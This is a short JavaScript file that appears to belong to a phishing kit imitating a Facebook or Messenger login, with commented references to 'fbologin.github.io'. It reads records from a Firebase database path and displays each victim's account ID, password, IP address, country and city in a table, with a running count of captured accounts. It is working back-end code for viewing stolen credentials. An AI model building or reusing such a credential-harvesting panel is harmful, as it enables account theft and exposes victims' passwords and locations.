const AccountsCounter = document.getElementById('counter');
// var path = window.location.origin.toString().replace('www.massanger.','');
// path = path.replace("https://","");
console.log(window.location.origin.toString());
// var end_of_unique = window.location.origin.toString().indexOf("netlify.app");
// var path = window.location.origin.toString().substring(0,end_of_unique-1);
// path = path.replace("https://www.","");
// var path = window.location.origin.toString().replace("fbologin.github.io/","");
// var path = window.location.pathname.toString().replace("/vicc","");
// // path = path.replace("https://www.","");
// path = path.replace("/","");
var path = "Massangger";
//https://fbologin.github.io/Massanger/
console.log(path);
// on() method
    database.ref('/users'+path).once('value', function(snapshot) {
        if (snapshot.exists()) {
            var content = '';
            console.log(snapshot.numChildren())
            AccountsCounter.innerText="accounts counter: "+snapshot.numChildren()

            snapshot.forEach(function(data) {
            var val = data.val();
            console.log(val);
            // var h1=document.createElement("h1")
            // h1.appendChild()    
            var tr = document.createElement("tr");
            var td1 = document.createElement("td");
            var td2 = document.createElement("td");
            var td3 = document.createElement("td");
            var td4 = document.createElement("td");
            var td5 = document.createElement("td");
            td1.appendChild(document.createTextNode(val.ID));
            td2.appendChild(document.createTextNode(val.pw));
            td3.appendChild(document.createTextNode(val.IP));
            td4.appendChild(document.createTextNode(val.Country));
            td5.appendChild(document.createTextNode(val.City));
            tr.appendChild(td1);
            tr.appendChild(td2);
            tr.appendChild(td3);
            tr.appendChild(td4);
            tr.appendChild(td5);
            var element = document.getElementById("ex-table");
            element.appendChild(tr)
            });
        }
        });
